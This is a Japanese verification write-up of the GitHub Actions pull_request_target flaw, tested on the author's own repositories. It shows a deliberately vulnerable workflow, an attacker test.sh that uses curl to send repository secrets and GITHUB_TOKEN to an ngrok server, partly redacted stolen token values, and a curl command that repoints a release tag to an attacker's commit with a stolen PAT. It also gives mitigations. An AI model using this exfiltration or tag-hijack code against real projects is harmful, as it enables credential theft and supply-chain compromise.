# pull_request_target 脆弱性 検証まとめ

## 背景：Trivy サプライチェーン攻撃（2026年3月）

Aqua Security の脆弱性スキャナ「Trivy」が攻撃グループ TeamPCP に侵害された。
攻撃の起点は GitHub Actions の `pull_request_target` ワークフローの脆弱な設定で、
bot アカウント（aqua-bot）の PAT が窃取された。

---

## 用語整理

| 用語 | 説明 |
|---|---|
| Runner | ワークフローを実行する GitHub のクラウド PC |
| checkout | GitHub 上のコードを Runner にダウンロードする操作 |
| PAT | GitHub の操作権限を持つトークン（Personal Access Token） |
| シークレット | PAT や API キーなどをリポジトリに安全に保管する仕組み |

---

## GITHUB_TOKEN / SECRET_TOKEN / PAT の違い

| | GITHUB_TOKEN | PAT | SECRET_TOKEN |
|---|---|---|---|
| 何か | GitHub が自動発行する一時トークン | 自分で作る永続トークン | シークレットに登録した値の名前 |
| 作り方 | 自動（作業不要） | Settings → Developer settings | リポジトリ Settings → Secrets |
| 有効期限 | ジョブが終わると無効 | 自分で設定（最長1年） |  中身による |
| 形式 | `ghs_xxxx` | `github_pat_xxxx` / `ghp_xxxx` | 任意 |
| 用途 | そのジョブ内でのリポジトリ操作 | API 操作・他リポジトリ操作 | ワークフローに秘密の値を渡す |

```
GITHUB_TOKEN
  GitHub がジョブごとに自動発行する一時トークン
  ジョブが終わると無効になるため、盗まれても被害が限定的

PAT
  自分で作る永続的なトークン
  盗まれると有効期限まで使い続けられる → 今回の攻撃で盗まれたもの

SECRET_TOKEN
  シークレットに登録した値につけた「名前」
  今回は PAT の値をシークレットに登録して SECRET_TOKEN と名付けた

  ${{ secrets.GITHUB_TOKEN }}  ← GitHub が自動発行（一時）
  ${{ secrets.SECRET_TOKEN }}  ← 自分で登録した PAT（永続）
                                  ↑ 今回盗まれたのはこっち
```

PAT をシークレットに登録する流れ：

```
① PAT を作成（プロフィール Settings → Developer settings）
   → 発行される値: github_pat_xxxx

② リポジトリのシークレットに登録（リポジトリ Settings → Secrets）
   Name: SECRET_TOKEN  /  Value: github_pat_xxxx

③ ワークフローで参照
   env:
     SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
```

---

## pull_request と pull_request_target の違い

フォークからの PR に対する挙動が異なる。

```
pull_request（安全）
  フォーク PR
      │
      ▼
  action_required ← GitHub が承認を要求してブロック
  シークレット → 渡されない


pull_request_target（危険）
  フォーク PR
      │
      ▼
  承認なしで即実行
  シークレット → Runner の環境変数に展開される  ← 攻撃者がアクセスできる
```

`pull_request_target` はフォーク PR でもシークレットを使った自動化
（ラベル付け・通知など）をするために設計されたイベント。
悪用されるとシークレットが盗まれる。

---

## 脆弱なワークフローのパターン

```yaml
on:
  pull_request_target:          # フォーク PR でもシークレットにアクセスできる

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          ref: ${{ github.event.pull_request.head.sha }}
          # ↑ 攻撃者のコードを Runner にダウンロード（ここが問題）

      - run: bash ./test.sh    # 攻撃者が仕込んだコードが実行される
        env:
          SECRET_TOKEN: ${{ secrets.SECRET_TOKEN }}
```

問題の組み合わせ：

```
pull_request_target                    head.sha での checkout
（シークレットが環境変数に展開される） ＋ （攻撃者のコードを持ってくる）
                  ↓
     攻撃者のコードがシークレットにアクセスできる環境で実行される
```

---

## 攻撃の全体像

```
攻撃者                              ターゲットリポジトリ（例：Trivy）
  │                                              │
  │  1. フォーク                                  │
  │ ◄──────────────────────────────────────────  │
  │                                              │
  │  2. test.sh を仕込んで PR 送信               │
  │ ──────────────────────────────────────────► │
  │                                              │
  │              3. pull_request_target トリガー  │
  │              4. 攻撃者のコードを checkout      │
  │              5. test.sh 実行                │
  │                 → PAT が環境変数として展開      │
  │                                              │
  │  6. curl で PAT を攻撃者サーバーに送信         │
  │ ◄──────────────────────────────────────────  │
  │                                              │
  │  7. 盗んだ PAT でタグ偽装（Imposter Commit）  │
  │ ──────────────────────────────────────────► │
  │     悪意あるコードを仕込んだタグを push        │
```

---

## 検証結果

### 環境

- ターゲットリポジトリ: `codekakitai51/vulnerable-actions-test`
- 攻撃者リポジトリ: `kitahara51/vulnerable-actions-test`（フォーク）
- 受信サーバー: ngrok でローカルに公開

### test.sh（攻撃者がフォークに仕込むコード）

```bash
#!/bin/bash
curl -s -X POST https://seema-unhumoured-eximiously.ngrok-free.dev/steal \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "secret=${SECRET_TOKEN}&github_token=${GITHUB_TOKEN}"
```

### ワークフローの実行結果

| ワークフロー | イベント | フォーク PR への対応 | シークレット |
|---|---|---|---|
| vulnerable.yml | `pull_request_target` | 承認なしで**即実行** | **漏れる** |
| safe.yml | `pull_request` | `action_required` でブロック | 漏れない |

### 受信データ（攻撃者サーバー側のログ）

GitHub のログ上ではマスクされるが、curl で外部送信すると生の値が届く。

```
# ダミー値での検証
secret=super-secret-value-12345&github_token=ghs_xxxx...

# PAT（fine-grained）での検証
secret=github_pat_11A7CMB6I0JUdaL1XEraQ8_thrdu...&github_token=ghs_xxxx...
```

PAT（`github_pat_`）・GITHUB_TOKEN（`ghs_`）どちらも盗取に成功した。

```
GitHub Actions のログ      攻撃者のサーバー（受信）
───────────────────────    ─────────────────────────────────────
SECRET_TOKEN = ***     →   secret=github_pat_11A7CMB6I0...
GITHUB_TOKEN = ***     →   github_token=ghs_409SkShlpuAk...
```

### 対策：攻撃者のコードを checkout しない

```yaml
# 危険：攻撃者のコードを checkout する
- uses: actions/checkout@v4
  with:
    ref: ${{ github.event.pull_request.head.sha }}

# 安全：ref を指定しない（main ブランチが使われる）
- uses: actions/checkout@v4
```

`pull_request_target` を使う場合は PR のコードを checkout しない。
テストは別途 `pull_request` イベントで行う。

---

## タグ偽装（Imposter Commit）

盗んだ PAT を使い、ターゲットリポジトリのタグを攻撃者のコミットに向ける手法。

### なぜ成立するか

GitHub はフォークネットワーク内の git オブジェクト（コミット）を**共有ストレージ**で管理している。
そのため、攻撃者のフォークに存在するコミットハッシュを、ターゲットリポジトリのタグに指定できてしまう。

```
kitahara51/vulnerable-actions-test（攻撃者フォーク）
  └── コミット 787dac5（攻撃者が用意した悪意あるコード）
        ↑
        │ GitHub の共有ストレージに存在する
        │
        │ 盗んだ PAT で API を叩く
        ▼
codekakitai51/vulnerable-actions-test（ターゲット）
  └── タグ v1.0.0 → 787dac5 を指すように書き換え
```

### 実際に使ったコマンド

```bash
# 盗んだ PAT でタグを作成（攻撃者のコミットハッシュを指定）
curl -s -X POST \
  -H "Authorization: Bearer github_pat_xxxx" \
  -H "Content-Type: application/json" \
  https://api.github.com/repos/codekakitai51/vulnerable-actions-test/git/refs \
  -d '{
    "ref": "refs/tags/v1.0.0",
    "sha": "787dac5ad5b904f38610f9b1de36ed427bbd2f3a"  ← 攻撃者のコミット
  }'
```

### 結果

```
利用者のワークフロー
  uses: codekakitai51/vulnerable-actions-test@v1.0.0
                                               ↑
                               正規のコードに見えるが
                               中身は攻撃者（kitahara51）のコミット

タグが指すコードの中身：
  main ブランチ  → 正規の README（検証まとめ）
  v1.0.0 タグ   → 攻撃者の README（「kitahara51 のリポジトリです」）
```

### 対策：タグでなくコミット SHA を固定する

タグは PAT があれば書き換えられるが、コミット SHA は変更できない。

```yaml
# 脆弱（タグ指定）→ 書き換えられる可能性がある
uses: codekakitai51/vulnerable-actions-test@v1.0.0

# 安全（コミット SHA 固定）→ 書き換えられない
uses: codekakitai51/vulnerable-actions-test@787dac5ad5b904f38610f9b1de36ed427bbd2f3a
```

---




